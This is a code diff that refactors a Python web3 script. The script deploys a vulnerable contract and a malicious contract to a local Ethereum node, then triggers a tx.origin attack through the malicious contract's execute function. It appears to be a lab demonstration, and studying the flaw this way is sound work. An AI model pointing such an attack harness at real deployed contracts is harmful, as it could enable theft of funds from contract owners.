@@ -1,36 +1,58 @@
 from web3 import Web3
 import json
 
-# Connect to Ethereum node
-w3 = Web3(Web3.HTTPProvider('http://localhost:8545'))
+# Configuration
+NODE_URL = 'http://localhost:8545'
+VULNERABLE_CONTRACT_PATH = 'TXOriginVulnerableContract.json'
+MALICIOUS_CONTRACT_PATH = 'MaliciousTXOriginContract.json'
 
-# Load vulnerable contract ABI and bytecode
-with open('TXOriginVulnerableContract.json') as f:
-    contract_data = json.load(f)
-vulnerable_abi = contract_data['abi']
-vulnerable_bytecode = contract_data['bytecode']
+def connect_to_ethereum(node_url):
+    """Establish connection to Ethereum node."""
+    try:
+        web3 = Web3(Web3.HTTPProvider(node_url))
+        if web3.isConnected():
+            print("Connected to Ethereum node.")
+            return web3
+        else:
+            raise ConnectionError("Failed to connect to Ethereum node.")
+    except Exception as e:
+        print(f"Connection error: {e}")
+        exit(1)
 
-# Load malicious contract ABI and bytecode
-with open('MaliciousTXOriginContract.json') as f:
-    malicious_data = json.load(f)
-malicious_abi = malicious_data['abi']
-malicious_bytecode = malicious_data['bytecode']
+def load_contract_data(file_path):
+    """Load contract ABI and bytecode from JSON file."""
+    with open(file_path) as f:
+        data = json.load(f)
+    return data['abi'], data['bytecode']
 
-# Deploy contracts
-def deploy_contract(abi, bytecode):
-    contract = w3.eth.contract(abi=abi, bytecode=bytecode)
+def deploy_contract(web3, abi, bytecode):
+    """Deploy contract to the Ethereum network."""
+    contract = web3.eth.contract(abi=abi, bytecode=bytecode)
     tx_hash = contract.constructor().transact()
-    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
-    return w3.eth.contract(address=tx_receipt.contractAddress, abi=abi)
+    tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
+    return web3.eth.contract(address=tx_receipt.contractAddress, abi=abi)
 
-vulnerable_contract = deploy_contract(vulnerable_abi, vulnerable_bytecode)
-malicious_contract = deploy_contract(malicious_abi, malicious_bytecode)
+def perform_tx_origin_attack(vulnerable_contract, malicious_contract, web3):
+    """Execute TX Origin attack using a malicious contract."""
+    try:
+        # Execute the attack
+        tx_hash = malicious_contract.functions.execute(vulnerable_contract.address).transact()
+        web3.eth.wait_for_transaction_receipt(tx_hash)
+        print("TX Origin attack executed successfully.")
+    except Exception as e:
+        print(f"TX Origin attack failed: {e}")
 
-# Perform TX Origin attack
-def perform_tx_origin_attack(vulnerable_contract, malicious_contract):
-    # Attacker sets up malicious contract
-    tx_hash = malicious_contract.functions.execute(vulnerable_contract.address).transact()
-    w3.eth.wait_for_transaction_receipt(tx_hash)
-    print("TX Origin attack completed.")
-
-perform_tx_origin_attack(vulnerable_contract, malicious_contract)
+if __name__ == "__main__":
+    # Setup
+    web3 = connect_to_ethereum(NODE_URL)
+    
+    # Load contracts
+    vulnerable_abi, vulnerable_bytecode = load_contract_data(VULNERABLE_CONTRACT_PATH)
+    malicious_abi, malicious_bytecode = load_contract_data(MALICIOUS_CONTRACT_PATH)
+    
+    # Deploy contracts
+    vulnerable_contract = deploy_contract(web3, vulnerable_abi, vulnerable_bytecode)
+    malicious_contract = deploy_contract(web3, malicious_abi, malicious_bytecode)
+    
+    # Perform attack
+    perform_tx_origin_attack(vulnerable_contract, malicious_contract, web3)
